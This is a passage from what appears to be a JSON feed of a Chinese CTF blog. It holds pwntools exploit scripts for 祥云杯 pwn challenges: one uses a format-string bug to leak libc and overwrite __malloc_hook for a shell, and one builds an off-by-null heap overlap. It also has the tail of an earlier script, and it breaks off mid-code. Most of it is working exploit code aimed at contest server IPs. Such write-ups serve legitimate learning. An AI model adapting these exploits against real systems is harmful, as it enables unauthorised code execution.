operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x150</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x150</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x148</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'flag\\x00'</span> <span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   datasystem.py\n@Time    :   2021/09/25 15:29:56\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "PWN",
                "BUUCTF",
                "rop",
                "长安杯",
                "天翼杯",
                "Das"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/",
            "url": "http://niyah.cn/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/",
            "title": "祥云杯部分Pwn",
            "date_published": "2021-08-30T14:10:27.000Z",
            "content_html": "<p>再不复现估计都忘了</p>\n<a id=\"more\"></a>\n<h1 id=\"note\"><a class=\"markdownIt-Anchor\" href=\"#note\">#</a> note</h1>\n<p>说实话看到这个格式化字符串漏洞时我反应了挺久的</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/1.png\" alt=\"1\"></p>\n<p>scanf 任意写，通过对 stdout 写入数据来泄露 libc，最后修改__malloc_hook 为 ogg 并通过 realloc 调整栈帧 getshell</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./2021note'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.70.90'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'25315'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'content:'</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'addr: 0x'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rint\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">say</span><span class=\"token punctuation\">(</span>agr <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'say ?'</span><span class=\"token punctuation\">,</span>agr<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'?'</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> one_gadget<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span>\nheap_addr <span class=\"token operator\">=</span> add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">'aaa'</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span>\nsay<span class=\"token punctuation\">(</span><span class=\"token string\">'%7$s'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\nleak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n_IO_2_1_stdin_ <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7f3038ceb8e0</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7f3038cea6e0</span><span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span>_IO_2_1_stdin_ <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span>\nogg <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> one_gad<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n__malloc_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span>\nrealloc <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'realloc'</span><span class=\"token punctuation\">]</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg('__isoc99_scanf')</span>\n\nsay<span class=\"token punctuation\">(</span><span class=\"token string\">'%7$saaaa'</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>__malloc_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>realloc <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># dbg('malloc')</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'size:'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   2021note.py\n@Time    :   2021/08/21 09:57:32\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"passwordbox_freeversion\"><a class=\"markdownIt-Anchor\" href=\"#passwordbox_freeversion\">#</a> PassWordBox_FreeVersion</h1>\n<p>add 这里有个 offbynull</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/2.png\" alt=\"1\"></p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/3.png\" alt=\"1\"></p>\n<p>程序会对输入的数据每八字节通过 key 进行异或，第一次 add 会输出加密数据所以第一次 add 的数据为空则会直接输出 key</p>\n<p>之后就是 offbynull 构造堆块重叠了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwdFree'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.71.220'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'38562'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input The ID You Want Save:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Length Of Your Pwd:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your Pwd:'</span><span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Delete:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Want Check:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> key\n    rst <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        rst <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> u64 <span class=\"token punctuation\">(</span> payload<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rst\n\n<span class=\"token comment\"># key 0x0000000000004040</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Save ID:'</span><span class=\"token punctuation\">)</span>\nkey <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span 